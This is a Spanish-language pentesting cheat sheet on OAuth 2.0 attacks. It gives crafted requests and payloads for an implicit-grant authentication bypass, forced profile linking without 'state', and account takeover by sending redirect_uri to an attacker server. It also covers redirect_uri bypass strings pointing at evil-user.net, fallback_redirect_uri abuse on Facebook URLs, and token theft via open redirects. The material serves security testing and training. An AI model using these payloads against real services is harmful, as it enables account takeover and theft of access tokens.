# OAuth 2.0

***

## Summary
- [Bypass de Autenticación a través de Implicit Grant Type](#bypass-de-autenticacion-a-traves-de-implicit-grant-type)
- [Endpoints con Información Sensible](#endpoints-con-informacion-sensible)
- [Vinculación Forzada de Perfiles OAuth](#vinculacion-forzada-de-perfiles-0auth)
- [Account Take Over con "redirect_uri"](#account-take-over-con-redirecturi)
- [Bypass "redirect_uri 01"](#bypass-redirecturi01)
- [Bypass "redirect_uri 02"](#bypass-redirecturi02)
- [Robar Tokens de Acceso con openRedirect](#robar-tokens-de-acceso-con-openredirect)
- [Iframe, postMessage() y window.location.href(\*)](#iframe-postmessage-y-windowslocationhref*)

***

## Bypass de Autenticación a través de Implicit Grant Type

Interceptar la request `/authenticate` y cambiar el valor correspondiente al parámetro que se envía, por el de otro usuario válido (e.g.: `test@test.net` --> `carlos@carlos-montoya.net`):
```
POST /authenticate HTTP/1.1
Host: [proveedorOAUTH]
Cookie: session=RTNhdbNYvS41LuseC7SIhX0m1f4AxYmM

{
    "email":"carlos@carlos-montoya.net",
    "username":"wiener",
    "token":"8vHFVoNGFiI9pD0nvJ6emJW2iZB-VM6SiBuuBDtdYC8"
}
```

***

## Endpoints con Información Sensible

Dan información para poder testear si es posible registrar una aplicación cliente maliciosa:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

***

## Vinculación Forzada de Perfiles OAuth

1.  Iniciar sesión con credenciales comunes.
2.  Cerrar sesión.
3.  Relogearse (esta vez sin credenciales, ya que la aplicación debería guardar el previo login) y adjuntar perfil de RR.SS. con BurpSuite activo.
4.  Interceptar la request que presente `oauth-linking`:

```
GET /auth?client_id=x3ywm971gmk1p5xowwqjl&redirect_uri=https://[appCliente]/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1

Host: [proveedorOAUTH]
```

5.  Verificar que no contenga el parámetro `state`.
6.  Adjuntar RR.SS. de nuevo y buscar la request:

```
GET /oauth-linking?code=[...]
```

7.  Copiar URL y rechazar la request para conservar el código.
8.  Elaborar ataque a víctima

## Account Take Over con "redirect_uri"

Iniciar sesión y buscar la request:
```
GET /auth?client_id=x3ywm971gmk1p5xowwqjl&redirect_uri=https://[appCliente]/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1

Host: [proveedorOAUTH]
```

Cambiar `redirect_uri` a:

```
redirect_uri=https://YOUR-EXPLOIT-SERVER-ID/
```

***

## Bypass "redirect_uri 01"
```
redirect_uri=https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```
```
redirect_uri=https://localhost.evil-user.net/
```
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&response_mode=query
```
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&response_mode=fragment
```
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```

***

## Bypass "redirect_uri 02"

Otra forma interesante de bypassear este parámetro es utilizando `fallback_redirect_uri`, siempre y cuando las condiciones en los parámetros anteriores a este se cumplan:

Si la petición se ve similar a la siguiente y no es posible un bypass:
```
https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414
&redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener
&response_type=token,signed_request
&scope=public_profile,email
```

Intentar con fallback_redirect_uri`:
```
https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414
&redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener
&response_type=token,signed_request
&scope=public_profile,email
&fallback_redirect_uri=https://www.instagram.com/
```

La anterior request redirigiría a una URL seleccionada en `fallback_redirect_uri` en caso de que el dominio de la URL dentro de `fallback_redirect_url` sea el mismo que un sitio web incluido en la lista blanca de la aplicación y si se cumplen todas las condiciones verdaderas. Se ejecutá y se realizá una redirección a la URL seleccionada en `fallback_redirect_uri` con el `código/access_token` de Facebook incrustado en la parte del fragmento de la URL.

Para explotar esta falla, es necesario tener una vulnerabilidad de `Open Redirect` en el dominio, ya que el parámetro `fallback_redirect_uri` también debería aceptar WhiteList como parte de la redirección.

***

## Robar Tokens de Acceso con openRedirect

Cambiar `redirect_uri` a:
```
redirect_uri=https://client-app.com/oauth/callback/../../path/dentro/de/aplicacion
```

Luego debe conseguir un OpenRedirect para explotación.

***

## Iframe, postMessage() y window.location.href(*)

1. Buscar alguna sección de comentarios que se ejecute bajo la etiqueta `iframe`. 
2. Mirar su atributo `src=[seguirURL]`.
3. Validar que se implemente `postMessage()` con `window.location.href(\*)`, es decir, hacia cualquier origen.
4. Evaluar posible explotación
